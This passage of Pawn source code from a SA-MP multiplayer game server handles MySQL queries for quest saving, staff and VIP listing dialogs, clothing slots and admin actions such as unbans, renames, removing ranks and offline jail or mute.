		questInfo[playerid][qt_EasyQuest][0], questInfo[playerid][qt_EasyQuest][1], questInfo[playerid][qt_EasyQuest][2], questInfo[playerid][qt_EasyQuest][3], questInfo[playerid][qt_EasyQuest][4], questInfo[playerid][qt_EasyQuest][5], questInfo[playerid][qt_EasyQuest][6], questInfo[playerid][qt_EasyQuest][7], questInfo[playerid][qt_EasyQuest][8], questInfo[playerid][qt_EasyQuest][9], PlayerInfo[playerid][xID]);
	mysql_tquery(mSQL, qQuest);

	mysql_format(mSQL, qQuest, sizeof(qQuest), "UPDATE `quests` \
		SET `easy_reward_quest_1`='%d', `easy_reward_quest_2`='%d', `easy_reward_quest_3`='%d', `easy_reward_quest_4`='%d', `easy_reward_quest_5`='%d', `easy_reward_quest_6`='%d', `easy_reward_quest_7`='%d', \
		`easy_reward_quest_8`='%d', `easy_reward_quest_9`='%d', `easy_reward_quest_10`='%d' WHERE `user_id`='%d'",
		questInfo[playerid][qt_EasyRewardQuest][0], questInfo[playerid][qt_EasyRewardQuest][1], questInfo[playerid][qt_EasyRewardQuest][2], questInfo[playerid][qt_EasyRewardQuest][3], questInfo[playerid][qt_EasyRewardQuest][4], questInfo[playerid][qt_EasyRewardQuest][5], questInfo[playerid][qt_EasyRewardQuest][6], questInfo[playerid][qt_EasyRewardQuest][7], questInfo[playerid][qt_EasyRewardQuest][8], questInfo[playerid][qt_EasyRewardQuest][9], PlayerInfo[playerid][xID]);
	mysql_tquery(mSQL, qQuest);
	return 1;
}

SMG_SetPlayerSkin(playerid, skin)
{
	PlayerTextDrawSetPreviewModel(playerid, Ingame_pTD[playerid][18], skin);
	if(!TogHud[playerid] && Spectate[playerid] == -1 && PlayerLogged[playerid]) PlayerTextDrawShow(playerid, Ingame_pTD[playerid][18]);
	return SetPlayerSkin(playerid, skin);
}

_:public selectQueryLeaderList( playerid )
{
    new rows, 
    	fields, 
    	p_name[ 24 ], 
    	last_login[ 22 ],
    	org_name[32],
    	is_online;

    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Online\t{FFFFFF}Organizacija\n" );

        for( new i = 0; i < rows; i++ )
		{
            is_online = cache_get_field_content_int( i, "isonline" );
            cache_get_field_content(i, "p_name", p_name, mSQL, 24);
            cache_get_field_content(i, "name", org_name, mSQL, 32);

            if( is_online == 0 )
			{
				cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

				format( globalstring, 150, "{FFFFFF}%s\t{FF0000}%s\t%s\n", p_name, last_login, org_name );
				strcat( DialogStrgEx, globalstring );
			}
			else
			{
				new id = GetPlayerIdFromName(p_name);

            	format( globalstring, 150, "{FFFFFF}[%d] %s\t{00FF00}Online\t%s\n", id, p_name, org_name);
				strcat( DialogStrgEx, globalstring );
			}
		}
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista svih Lidera:", DialogStrgEx, "OK", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
    else SendErrorMessage( playerid, "Nema admina." );
    return 1;
}

_:public selectQueryAdminList( playerid )
{
    new rows, 
    	fields, 
    	p_name[ 24 ], 
    	last_login[ 22 ], 
    	admin_lvl, 
    	is_online;

    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Admin\t{FFFFFF}Online\t{FFFFFF}Duty\t{FFFFFF}Stats\n" );

        for( new i = 0; i < rows; i++ )
		{
            admin_lvl = cache_get_field_content_int( i, "admin_lvl" );
            is_online = cache_get_field_content_int( i, "isonline" );
            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

            if( is_online == 0 )
			{
				cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

				format( globalstring, 150, "{FFFFFF}%s\t%s\t{FF0000}%s\t{FF0000}OffDuty\n", p_name, getAdminRankNamebyRankNumber(admin_lvl), last_login );
				strcat( DialogStrgEx, globalstring );
			}
			else
			{
				new id = GetPlayerIdFromName(p_name);

            	format( globalstring, 150, "{FFFFFF}[%d] %s\t%s\t{00FF00}Online\t%s\n", id, p_name, getAdminRankNamebyRankNumber(admin_lvl), (AdminDuty[id] == true) ? ("{00FF00}OnDuty") : ("{FF0000}OffDuty"));
				strcat( DialogStrgEx, globalstring );
			}
		}
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista svih Admina:", DialogStrgEx, "OK", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
    else SendErrorMessage( playerid, "Nema admina." );
    return 1;
}

_:public selectQuerySpecAdminList( playerid )
{
    new rows, 
    	fields, 
    	p_name[ 24 ], 
    	last_login[ 22 ], 
    	is_online;

    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Online\t{FFFFFF}Duty\n" );

        for( new i = 0; i < rows; i++ )
		{
            is_online = cache_get_field_content_int( i, "isonline" );
            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

            if( is_online == 0 )
			{
				cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

				format( globalstring, 150, "{FFFFFF}%s\t{FF0000}%s\t{FF0000}OffDuty\n", p_name, last_login );
				strcat( DialogStrgEx, globalstring );
			}
			else
			{
				new id = GetPlayerIdFromName(p_name);

            	format( globalstring, 150, "{FFFFFF}[%d] %s\t{00FF00}Online\t%s\n", id, p_name, (AdminDuty[id] == true) ? ("{00FF00}OnDuty") : ("{FF0000}OffDuty"));
				strcat( DialogStrgEx, globalstring );
			}
		}
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista svih Spec Admina:", DialogStrgEx, "OK", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
    else SendErrorMessage( playerid, "Nema spec admina." );
    return 1;
}

_:public selectQueryGamemasterList( playerid )
{
    new rows, 
    	fields, 
    	p_name[ 24 ], 
    	last_login[ 22 ], 
    	helper_level,
    	is_online;

    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}GameMaster\t{FFFFFF}Online\t{FFFFFF}Duty\n" );

        for( new i = 0; i < rows; i ++ )
		{
            helper_level = cache_get_field_content_int( i, "helper_level" );
            is_online = cache_get_field_content_int( i, "isonline" );
            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

			if( is_online == 0 )
			{
				cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

				format( globalstring, 150, "{FFFFFF}%s\tGM:%d\t{FF0000}%s\t{FF0000}OffDuty\n", p_name, helper_level, last_login );
				strcat( DialogStrgEx, globalstring );
			}
			else
			{
				new id = GetPlayerIdFromName(p_name);

            	format( globalstring, 150, "{FFFFFF}[%d] %s\tGM:%d\t{00FF00}Online\t%s\n", id, p_name, helper_level, (AdminDuty[id] == true) ? ("{00FF00}OnDuty") : ("{FF0000}OffDuty"));
				strcat( DialogStrgEx, globalstring );
			}
		}
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista svih GameMastera:", DialogStrgEx, "OK", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

    }
    else SendErrorMessage( playerid, "Nema gamemastera." );
    return 1;
}

_:public selectQueryVipList( playerid )
{
    new rows, 
    	fields, 
    	p_name[ 24 ], 
    	last_login[ 22 ], 
    	Vip_llc, 
    	is_online;

    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}VIP Level\t{FFFFFF}Status\n" );

        for( new i = 0; i < rows; i++)
		{
            Vip_llc = cache_get_field_content_int( i, "vip_level" );
            is_online = cache_get_field_content_int( i, "isonline" );
            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

            if(is_online == 0 )
            {
            	cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

				format( globalstring, sizeof( globalstring ), "{FFFFFF}%s\t%d\t{FF0000}%s\n", p_name, Vip_llc, last_login );
				strcat( DialogStrgEx, globalstring );
			}
			else
			{
            	format( globalstring, sizeof( globalstring ), "{FFFFFF}[%d] %s\t%d\t{00FF00}Online\n", GetPlayerIdFromName(p_name), p_name, Vip_llc );
				strcat( DialogStrgEx, globalstring );
			}
		}
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista svih VIPova:", DialogStrgEx, "OK", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
    else SendErrorMessage( playerid, "Nema VIPova." );
    return 1;
}

_:public selectQueryPromoterList( playerid )
{
    new rows, 
    	fields, 
    	p_name[ 24 ], 
    	last_login[ 22 ],
    	is_online,
    	promo;

    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Promoter\t{FFFFFF}Status\n" );

        for( new i = 0; i < rows; i ++ )
		{
            promo = cache_get_field_content_int( i, "promoter_level" );
            is_online = cache_get_field_content_int( i, "isonline" );
            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

            if(is_online == 0 )
            {
            	cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

				format( globalstring, sizeof( globalstring ), "{FFFFFF}%s\tP:%d\t{FF0000}%s\n", p_name, promo, last_login );
				strcat( DialogStrgEx, globalstring );
			}
			else
			{
            	format( globalstring, sizeof( globalstring ), "{FFFFFF}[%d] %s\tP:%d\t{00FF00}Online\n", GetPlayerIdFromName(p_name), p_name, promo );
				strcat( DialogStrgEx, globalstring );
			}
		}
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista svih Promotera:", DialogStrgEx, "OK", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
    else SendErrorMessage( playerid, "Nema Promotera." );
    return 1;
}

_:public selectQueryYouTuberList( playerid )
{
    new rows, 
    	fields, 
    	p_name[ 24 ], 
    	last_login[ 22 ],
    	is_online,
    	promo;

    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}YouTuber\t{FFFFFF}Status\n" );

        for( new i = 0; i < rows; i ++ )
		{
            promo = cache_get_field_content_int( i, "xYouTuber" );
            is_online = cache_get_field_content_int( i, "isonline" );
            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

            if(is_online == 0 )
            {
            	cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

				format( globalstring, sizeof( globalstring ), "{FFFFFF}%s\tYT:%d\t{FF0000}%s\n", p_name, promo, last_login );
				strcat( DialogStrgEx, globalstring );
			}
			else
			{
            	format( globalstring, sizeof( globalstring ), "{FFFFFF}[%d] %s\tYT:%d\t{00FF00}Online\n", GetPlayerIdFromName(p_name), p_name, promo );
				strcat( DialogStrgEx, globalstring );
			}
		}
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista svih YouTubera:", DialogStrgEx, "OK", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
    else SendErrorMessage( playerid, "Nema YouTubera." );
    return 1;
}

_:public selectQueryVehModelList( playerid, model )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		new autoid = -1, vehSqlID = -1;
        for( new j = 0; j < rows; j ++ )
		{
        	vehSqlID = cache_get_field_content_int( j, "veh_id" );
			if( vehSqlID != -1 )
			{
	            for( new i = 1; i <= GetVehiclePoolSize(); i++ )
				{
					if( VehicleInfo[ i ][ vSqlID ] == vehSqlID )
					{
					    format( globalstring, sizeof( globalstring ), "{FFFFFF}[ ingameID - %d ] - {4282C0}[ sqlBaseID - %d ]\n", i, vehSqlID );
						strcat( DialogStrgEx, globalstring );
						autoid = i;
					}
				}
				if( autoid == -1 )
				{
					format( globalstring, sizeof( globalstring ), "{FFFFFF}[ nije kreirano ingame ] - {4282C0}[ sqlBaseID - %d ]\n", vehSqlID );
					strcat( DialogStrgEx, globalstring );
				}
			}
		}

		if( strlen( DialogStrgEx ) == 0 ) return SendErrorMessage( playerid, "Nema nijednog vozila sa unetim modelom." );

		format( globalstring, sizeof( globalstring ), "{4282C0}VOZILA - {FFFFFF}%s", GetVehicleNameEx( model ) );
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, globalstring, DialogStrgEx, "OK", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
    return 1;
}

_:public OnClothesLoad( playerid )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        new query[ 2048 ];
		format( query, sizeof( query ),
			"INSERT INTO `user_clothes` (user_id, cloth_slot_1, cloth_slot_1_p1, cloth_slot_1_p2, cloth_slot_1_p3, cloth_slot_1_p4, cloth_slot_1_p5, cloth_slot_1_p6, cloth_slot_1_p7, cloth_slot_1_p8, cloth_slot_1_p9, \
				cloth_slot_2, cloth_slot_2_p1, cloth_slot_2_p2, cloth_slot_2_p3, cloth_slot_2_p4, cloth_slot_2_p5, cloth_slot_2_p6, cloth_slot_2_p7, cloth_slot_2_p8, cloth_slot_2_p9," );

        format( query, sizeof( query ), "%s cloth_slot_3, cloth_slot_3_p1, cloth_slot_3_p2, cloth_slot_3_p3, cloth_slot_3_p4, cloth_slot_3_p5, cloth_slot_3_p6, cloth_slot_3_p7, cloth_slot_3_p8, cloth_slot_3_p9, \
			    cloth_slot_4, cloth_slot_4_p1, cloth_slot_4_p2, cloth_slot_4_p3, cloth_slot_4_p4, cloth_slot_4_p5, cloth_slot_4_p6, cloth_slot_4_p7, cloth_slot_4_p8, cloth_slot_4_p9 )", query );

		mysql_format( mSQL, query, sizeof( query ), "%s VALUES('%d', \
			'%d', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', \
			'%d', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', \
			'%d', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', \
			'%d', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f')", query, PlayerInfo[ playerid ][ xID ],
	            clothes_info[ playerid ][ x_slot_1_model ], clothes_info[ playerid ][ x_slot_1_pos ][ 0 ], clothes_info[ playerid ][ x_slot_1_pos ][ 1 ],
				clothes_info[ playerid ][ x_slot_1_pos ][ 2 ], clothes_info[ playerid ][ x_slot_1_pos ][ 3 ], clothes_info[ playerid ][ x_slot_1_pos ][ 4 ],
				clothes_info[ playerid ][ x_slot_1_pos ][ 5 ], clothes_info[ playerid ][ x_slot_1_pos ][ 6 ], clothes_info[ playerid ][ x_slot_1_pos ][ 7 ],
				clothes_info[ playerid ][ x_slot_1_pos ][ 8 ],
				clothes_info[ playerid ][ x_slot_2_model ], clothes_info[ playerid ][ x_slot_2_pos ][ 0 ], clothes_info[ playerid ][ x_slot_2_pos ][ 1 ],
				clothes_info[ playerid ][ x_slot_2_pos ][ 2 ], clothes_info[ playerid ][ x_slot_2_pos ][ 3 ], clothes_info[ playerid ][ x_slot_2_pos ][ 4 ],
				clothes_info[ playerid ][ x_slot_2_pos ][ 5 ], clothes_info[ playerid ][ x_slot_2_pos ][ 6 ], clothes_info[ playerid ][ x_slot_2_pos ][ 7 ],
				clothes_info[ playerid ][ x_slot_2_pos ][ 8 ],
				clothes_info[ playerid ][ x_slot_3_model ], clothes_info[ playerid ][ x_slot_3_pos ][ 0 ], clothes_info[ playerid ][ x_slot_3_pos ][ 1 ],
				clothes_info[ playerid ][ x_slot_3_pos ][ 2 ], clothes_info[ playerid ][ x_slot_3_pos ][ 3 ], clothes_info[ playerid ][ x_slot_3_pos ][ 4 ],
				clothes_info[ playerid ][ x_slot_3_pos ][ 5 ], clothes_info[ playerid ][ x_slot_3_pos ][ 6 ], clothes_info[ playerid ][ x_slot_3_pos ][ 7 ],
				clothes_info[ playerid ][ x_slot_3_pos ][ 8 ],
				clothes_info[ playerid ][ x_slot_4_model ], clothes_info[ playerid ][ x_slot_4_pos ][ 0 ], clothes_info[ playerid ][ x_slot_4_pos ][ 1 ],
				clothes_info[ playerid ][ x_slot_4_pos ][ 2 ], clothes_info[ playerid ][ x_slot_4_pos ][ 3 ], clothes_info[ playerid ][ x_slot_4_pos ][ 4 ],
				clothes_info[ playerid ][ x_slot_4_pos ][ 5 ], clothes_info[ playerid ][ x_slot_4_pos ][ 6 ], clothes_info[ playerid ][ x_slot_4_pos ][ 7 ],
				clothes_info[ playerid ][ x_slot_4_pos ][ 8 ] );

		mysql_tquery( mSQL, query);
    }
    else
	{
		clothes_info[ playerid ][ x_slot_1_model ]				= 	cache_get_field_content_int(0, "cloth_slot_1");
		clothes_info[ playerid ][ x_slot_1_pos ][ 0 ]			= 	cache_get_field_content_float(0, "cloth_slot_1_p1");
		clothes_info[ playerid ][ x_slot_1_pos ][ 1 ]			= 	cache_get_field_content_float(0, "cloth_slot_1_p2");
		clothes_info[ playerid ][ x_slot_1_pos ][ 2 ]			= 	cache_get_field_content_float(0, "cloth_slot_1_p3");
		clothes_info[ playerid ][ x_slot_1_pos ][ 3 ]			= 	cache_get_field_content_float(0, "cloth_slot_1_p4");
		clothes_info[ playerid ][ x_slot_1_pos ][ 4 ]			= 	cache_get_field_content_float(0, "cloth_slot_1_p5");
		clothes_info[ playerid ][ x_slot_1_pos ][ 5 ]			= 	cache_get_field_content_float(0, "cloth_slot_1_p6");
		clothes_info[ playerid ][ x_slot_1_pos ][ 6 ]			= 	cache_get_field_content_float(0, "cloth_slot_1_p7");
		clothes_info[ playerid ][ x_slot_1_pos ][ 7 ]			= 	cache_get_field_content_float(0, "cloth_slot_1_p8");
		clothes_info[ playerid ][ x_slot_1_pos ][ 8 ]			= 	cache_get_field_content_float(0, "cloth_slot_1_p9");

		clothes_info[ playerid ][ x_slot_2_model ]				= 	cache_get_field_content_int(0, "cloth_slot_2");
		clothes_info[ playerid ][ x_slot_2_pos ][ 0 ]			= 	cache_get_field_content_float(0, "cloth_slot_2_p1");
		clothes_info[ playerid ][ x_slot_2_pos ][ 1 ]			= 	cache_get_field_content_float(0, "cloth_slot_2_p2");
		clothes_info[ playerid ][ x_slot_2_pos ][ 2 ]			= 	cache_get_field_content_float(0, "cloth_slot_2_p3");
		clothes_info[ playerid ][ x_slot_2_pos ][ 3 ]			= 	cache_get_field_content_float(0, "cloth_slot_2_p4");
		clothes_info[ playerid ][ x_slot_2_pos ][ 4 ]			= 	cache_get_field_content_float(0, "cloth_slot_2_p5");
		clothes_info[ playerid ][ x_slot_2_pos ][ 5 ]			= 	cache_get_field_content_float(0, "cloth_slot_2_p6");
		clothes_info[ playerid ][ x_slot_2_pos ][ 6 ]			= 	cache_get_field_content_float(0, "cloth_slot_2_p7");
		clothes_info[ playerid ][ x_slot_2_pos ][ 7 ]			= 	cache_get_field_content_float(0, "cloth_slot_2_p8");
		clothes_info[ playerid ][ x_slot_2_pos ][ 8 ]			= 	cache_get_field_content_float(0, "cloth_slot_2_p9");

		clothes_info[ playerid ][ x_slot_3_model ]				= 	cache_get_field_content_int(0, "cloth_slot_3");
		clothes_info[ playerid ][ x_slot_3_pos ][ 0 ]			= 	cache_get_field_content_float(0, "cloth_slot_3_p1");
		clothes_info[ playerid ][ x_slot_3_pos ][ 1 ]			= 	cache_get_field_content_float(0, "cloth_slot_3_p2");
		clothes_info[ playerid ][ x_slot_3_pos ][ 2 ]			= 	cache_get_field_content_float(0, "cloth_slot_3_p3");
		clothes_info[ playerid ][ x_slot_3_pos ][ 3 ]			= 	cache_get_field_content_float(0, "cloth_slot_3_p4");
		clothes_info[ playerid ][ x_slot_3_pos ][ 4 ]			= 	cache_get_field_content_float(0, "cloth_slot_3_p5");
		clothes_info[ playerid ][ x_slot_3_pos ][ 5 ]			= 	cache_get_field_content_float(0, "cloth_slot_3_p6");
		clothes_info[ playerid ][ x_slot_3_pos ][ 6 ]			= 	cache_get_field_content_float(0, "cloth_slot_3_p7");
		clothes_info[ playerid ][ x_slot_3_pos ][ 7 ]			= 	cache_get_field_content_float(0, "cloth_slot_3_p8");
		clothes_info[ playerid ][ x_slot_3_pos ][ 8 ]			= 	cache_get_field_content_float(0, "cloth_slot_3_p9");

		clothes_info[ playerid ][ x_slot_4_model ]				= 	cache_get_field_content_int(0, "cloth_slot_4");
		clothes_info[ playerid ][ x_slot_4_pos ][ 0 ]			= 	cache_get_field_content_float(0, "cloth_slot_4_p1");
		clothes_info[ playerid ][ x_slot_4_pos ][ 1 ]			= 	cache_get_field_content_float(0, "cloth_slot_4_p2");
		clothes_info[ playerid ][ x_slot_4_pos ][ 2 ]			= 	cache_get_field_content_float(0, "cloth_slot_4_p3");
		clothes_info[ playerid ][ x_slot_4_pos ][ 3 ]			= 	cache_get_field_content_float(0, "cloth_slot_4_p4");
		clothes_info[ playerid ][ x_slot_4_pos ][ 4 ]			= 	cache_get_field_content_float(0, "cloth_slot_4_p5");
		clothes_info[ playerid ][ x_slot_4_pos ][ 5 ]			= 	cache_get_field_content_float(0, "cloth_slot_4_p6");
		clothes_info[ playerid ][ x_slot_4_pos ][ 6 ]			= 	cache_get_field_content_float(0, "cloth_slot_4_p7");
		clothes_info[ playerid ][ x_slot_4_pos ][ 7 ]			= 	cache_get_field_content_float(0, "cloth_slot_4_p8");
		clothes_info[ playerid ][ x_slot_4_pos ][ 8 ]			= 	cache_get_field_content_float(0, "cloth_slot_4_p9");
	}
	return 1;
}

_:public CheckPlayerUnBan( playerid, imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        SendErrorMessage( playerid, "Taj igrac nije banovan!");
    }
    else
	{
        PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );
	    ServerInfo[ BanovanihKorisnika ]--;

		AdminMsg( ADM_WARN, "[ADMIN] %s je unbanovao igraca %s.", ImeIgraca( playerid ), imeigraca );
		SCMF( playerid, -1, "Unbanovali ste igraca %s!", imeigraca );

		sql_user_unban( cache_get_field_content_int( 0, "user_id" ) );
		WriteLog("log-unban", "Admin %s je unbanovao igraca %s", ImeIgraca( playerid ), imeigraca);
    }
	return 1;
}

_:public CheckPlayerRename( renameid, playerid, novoime[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
	    SendErrorMessage( playerid, "Novo ime vec postoji u bazi podataka!" );
    }
    else
	{
		DodajWarnRed("~r~#RENAME: ~w~Admin ~r~%s ~w~je promenio ime igracu ~r~%s ~w~u ~r~%s.", ImeIgraca( playerid ), ImeIgraca( renameid ), novoime );
		RenamePlayer( ImeIgraca( renameid ), novoime, renameid );
		SendInfoMessage( renameid, "Admin %s vam je promenio ime u %s.", ImeIgraca( playerid ), ImeIgraca( renameid ) );
    }
    return 1;
}

_:public CheckPlayerOffRank( playerid, type, imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
	    SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else
	{
        new user_id = cache_get_field_content_int( 0, "user_id" );

        switch(type)
        {
	        case 1:
			{
				new q[ 144 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `admin_lvl` = '0', `spawn` = '0' WHERE `user_id` = '%d' LIMIT 1", user_id );
		    	mysql_tquery( mSQL, q );

				SCMF( playerid, CRVENA, "#OFFRANK: {FFFFFF}Smenili ste offline Admina %s.", imeigraca );

				WriteLog("log-smjenjivanja", "Admin %s je smenio %s sa pozicije Admina", ImeIgraca( playerid ), imeigraca);
	        }
	        case 2:
			{
	            new q[ 144 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `helper_level` = '0', `spawn` = '0' WHERE `user_id` = '%d' LIMIT 1", user_id );
		    	mysql_tquery( mSQL, q );

				SCMF( playerid, CRVENA, "#OFFRANK: {FFFFFF}Smenili ste offline Gamemastera %s.", imeigraca );

				WriteLog("log-smjenjivanja", "Admin %s je smenio %s sa pozicije Gamemastera.", ImeIgraca( playerid ), imeigraca);
	        }
			case 3:
			{
			    new q[ 144 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xSpecAdmin` = '0', `spawn` = '0' WHERE `user_id` = '%d' LIMIT 1", user_id );
		    	mysql_tquery( mSQL, q );

				SCMF( playerid, CRVENA, "#OFFRANK: {FFFFFF}Smenili ste offline Spec Admina %s.", imeigraca );

				WriteLog("log-smjenjivanja", "Admin %s je smenio %s sa pozicije Spec Admina.", ImeIgraca( playerid ), imeigraca);
			}
			case 4:
			{
			    new q[ 144 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `vip_level` = '0', `vip_time` = '0', `spawn` = '0' WHERE `user_id` = '%d' LIMIT 1", user_id );
		    	mysql_tquery( mSQL, q );

				SCMF( playerid, CRVENA, "#OFFRANK: {FFFFFF}Smenili ste offline VIPa %s.", imeigraca );

				WriteLog("log-smjenjivanja", "Admin %s je smenio %s sa pozicije Vipa.", ImeIgraca( playerid ), imeigraca);
			}
			case 5:
			{
			    new q[ 144 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `promoter_level` = '0', `spawn` = '0' WHERE `user_id` = '%d' LIMIT 1", user_id );
		    	mysql_tquery( mSQL, q );

				SCMF( playerid, CRVENA, "#OFFRANK: {FFFFFF}Smenili ste offline Promotera %s.", imeigraca );

				WriteLog("log-smjenjivanja", "Admin %s je smenio %s sa pozicije Promotera.", ImeIgraca( playerid ), imeigraca);
			}
			case 6:
			{
			    new q[ 144 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xYouTuber` = '0', `spawn` = '0' WHERE `user_id` = '%d' LIMIT 1", user_id );
		    	mysql_tquery( mSQL, q );

				SCMF( playerid, CRVENA, "#OFFRANK: {FFFFFF}Smenili ste offline YouTubera %s.", imeigraca );

				WriteLog("log-smjenjivanja", "Admin %s je smenio %s sa pozicije YouTubera.", ImeIgraca( playerid ), imeigraca);
			}
		}
	}
    return 1;
}

_:public CheckPlayerOffJandP( playerid, type, const imeigraca[], vreme, const razlog[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows ) 
    {
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else {

        new user_id = cache_get_field_content_int( 0, "user_id" );

		switch(type)
		{
			case JAIL:
			{
	    	    new q[ 150 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '%d', `jail_time` = '%d', `offpjail` = '%e' WHERE `user_id` = '%d' LIMIT 1", JAIL, vreme, razlog, user_id );
		    	mysql_tquery( mSQL, q );

		    	PlayerInfo[ playerid ][ xAGMStats ]++;
			    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

				SCMF( playerid, 0xFF6347FF, "#OFFJAIL: Postavili ste offline igraca %s u zatvor na %d minuta. Razlog: %s", imeigraca, vreme, razlog );

				WriteLog("log-punishment", "Admin %s je offjailovao igraca %s | Razlog: %s", ImeIgraca( playerid ), imeigraca, razlog);
	    	}
	    	case PRISON:
			{
	    	    new q[ 150 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '%d', `jail_time` = '%d', `offpprison` = '%e' WHERE `user_id` = '%d' LIMIT 1", PRISON, vreme, razlog, user_id );
		    	mysql_tquery( mSQL, q );

		    	PlayerInfo[ playerid ][ xAGMStats ]++;
		    	sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

				SCMF( playerid, 0xFF6347FF, "#OFFJAIL: Postavili ste offline igraca %s u prison na %d sati. Razlog: %s", imeigraca, (vreme/60), razlog );

				WriteLog("log-punishment", "Admin %s je offprisonao igraca %s | Razlog: %s", ImeIgraca( playerid ), imeigraca, razlog);
	    	}
	    	case MUTE:
	    	{
	    	    new q[ 150 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `mute` = '%d', `offpmute` = '%e' WHERE `user_id` = '%d' LIMIT 1", vreme, razlog, user_id );
		    	mysql_tquery( mSQL, q );

				SCMF( playerid, 0xFF6347FF, "#OFFMUTE: Postavili ste offline igraca %s mute na %d minuta. Razlog: %s", imeigraca, (vreme/60), razlog );

				WriteLog("log-punishment", "Admin %s je offmute igraca %s | Razlog: %s", ImeIgraca( playerid ), imeigraca, razlog);
	    	}
    	}
    }
    return 1;
}

_:public CheckPlayerRemoveAcc( playerid, imeigraca[] )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows ) 
    {
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else {

        new property_id_1 = cache_get_field_content_int( 0, "property_id_1" );
        new property_id_2 = cache_get_field_content_int( 0, "property_id_2" );
        new property_id_3 = cache_get_field_content_int( 0, "property_id_3" );
        new bussines_id = cache_get_field_content_int( 0, "bussines_id" );

